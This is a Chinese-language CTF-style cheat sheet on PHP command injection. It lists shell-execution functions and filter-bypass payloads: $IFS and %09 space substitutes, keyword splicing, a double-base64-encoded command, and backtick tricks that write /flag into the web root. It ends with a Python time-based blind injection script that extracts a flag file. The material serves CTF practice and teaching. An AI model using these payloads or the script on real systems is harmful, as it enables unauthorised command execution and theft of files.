---
title: 【WEB】命令执行
---

# 命令执行

以下介绍为 PHP 环境

用于命令执行的函数有

```
system
exec
passthru
shell_exec
```



## 一些常见的绕过方法

命令拼接

<img src="/images/exec/1.png" alt="image-20201218105802" style="zoom: 67%;"/>

以及

```
%0a
%0d
\n
```

空格绕过

```
$IFS
${IFS}
$IFS$1
%09
{cat,flag.php}
```

关键字 flag 被过滤

```
fla\g
a=g;fla$a
```

例如：

```
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

或者使用 base64 编码绕过

```
?url=127.0.0.1|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`
```

另外如反引号可在语句中执行命令

```
ls `cat /flag > /var/www/html/1.txt`
```

或者使用 $() 和八进制

```
$(printf$IFS$9"\154\163")
```

另附一份无回显盲注脚本

```
import requests
import time

s=requests.session()
flag=''
for z in range(1,50):
    for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%|^&{}[]/-()+=,\\':
        starTime=time.time()
        url="http://127.0.0.1/?cmd=if [ `cut -c"+str(z)+"-"+str(z)+" /flag` != '"+i+"' ]; then echo 1 ; else sleep 3; fi"
        r=s.get(url)
        if((time.time()-starTime)>3):
            flag+=i
            print(flag)
            break
    print(z)
print('the flag is'+flag)
```